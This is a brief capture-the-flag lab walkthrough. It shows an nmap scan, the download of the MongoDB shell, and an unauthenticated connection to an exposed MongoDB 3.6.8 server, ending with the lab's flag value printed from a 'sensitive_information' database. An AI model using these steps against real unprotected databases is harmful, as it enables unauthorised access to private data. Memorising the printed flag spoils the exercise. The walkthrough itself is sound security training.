Straight forward exercise

┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-sjcnwd8pzf]─[~]
└──╼ [★]$ nmap -p- --min-rate=1000 -sV 10.129.228.30
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-04 08:14 EDT
Nmap scan report for 10.129.228.30
Host is up (0.28s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.41 seconds
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-sjcnwd8pzf]─[~]
└──╼ [★]$ curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--      0 78.4M    0 65536    0     0  97412      0  0:14:04 --:--:--  0:14:04 973100 78.4M  100 78.4M    0     0  93.5M      0 --:--:-- --:--:-- --:--:-- 93.5M
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-sjcnwd8pzf]─[~]
└──╼ [★]$ tar xvf mongosh-2.3.2-linux-x64.tgz
mongosh-2.3.2-linux-x64/
mongosh-2.3.2-linux-x64/.sbom.json
mongosh-2.3.2-linux-x64/LICENSE-crypt-library
mongosh-2.3.2-linux-x64/LICENSE-mongosh
mongosh-2.3.2-linux-x64/README
mongosh-2.3.2-linux-x64/THIRD_PARTY_NOTICES
mongosh-2.3.2-linux-x64/bin/
mongosh-2.3.2-linux-x64/mongosh.1.gz
mongosh-2.3.2-linux-x64/bin/mongosh
mongosh-2.3.2-linux-x64/bin/mongosh_crypt_v1.so
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-sjcnwd8pzf]─[~]
└──╼ [★]$ cd mongosh-2.3.2-linux-x64/bin
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-sjcnwd8pzf]─[~/mongosh-2.3.2-linux-x64/bin]
└──╼ [★]$ ./mongosh mongodb://10.129.228.30:27017
Current Mongosh Log ID:	6a9ab6ef8268da8836fe6910
Connecting to:		mongodb://10.129.228.30:27017/?directConnection=true&appName=mongosh+2.3.2
Using MongoDB:		3.6.8
Using Mongosh:		2.3.2
mongosh 2.10.0 is available for download: https://www.mongodb.com/try/download/shell

For mongosh info see: https://www.mongodb.com/docs/mongodb-shell/


To help improve our products, anonymous usage data is collected and sent to MongoDB periodically (https://www.mongodb.com/legal/privacy-policy).
You can opt-out by running the disableTelemetry() command.

------
   The server generated these startup warnings when booting
   2026-09-04T11:26:37.636+0000: 
   2026-09-04T11:26:37.636+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2026-09-04T11:26:37.636+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2026-09-04T11:26:39.137+0000: 
   2026-09-04T11:26:39.137+0000: ** WARNING: Access control is not enabled for the database.
   2026-09-04T11:26:39.137+0000: **          Read and write access to data and configuration is unrestricted.
   2026-09-04T11:26:39.137+0000:
------

test> show dbs;
admin                  32.00 KiB
config                 72.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
test> use sensitive_information;
switched to db sensitive_information
sensitive_information> show collections;
flag
sensitive_information> db.flag.find();
[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
  }
]
sensitive_information> 
